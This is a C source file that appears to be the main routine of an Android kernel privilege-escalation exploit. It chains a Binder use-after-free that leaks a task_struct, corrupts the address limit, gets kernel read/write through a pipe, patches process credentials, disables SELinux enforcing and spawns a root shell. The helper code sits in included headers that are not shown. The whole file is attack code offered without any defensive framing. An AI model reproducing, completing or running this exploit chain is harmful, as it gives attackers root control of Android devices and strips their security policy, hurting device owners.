#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/binder.h"
#include "../include/binder_uaf.h"
#include "../include/corrupt_address_limit.h"
#include "../include/cpu_affinity.h"
#include "../include/kernel_rw.h"
#include "../include/privilege_escalation.h"

int main() {
  int pipefd[2] = {0};
  struct task_struct *leak_task_struct = NULL;
  leaked_kernel_addrs addrs = {0};

  pin_cpu(0);

  binder_ctx *ctx = open_binder(BINDER_DEVICE);

  binder_uaf_leak_task_struct(ctx, &leak_task_struct, &addrs);
  corrupt_address_limit(ctx, &leak_task_struct);
  init_kernel_read_write_pipe(pipefd);
  patch_cred(pipefd, leak_task_struct, addrs.cred);
  disable_selinux_enforcing(pipefd, addrs.nsproxy);
  verify_root();

  close_binder(ctx);
  close(pipefd[0]);
  close(pipefd[1]);

  spawn_root_shell();

  return 0;
}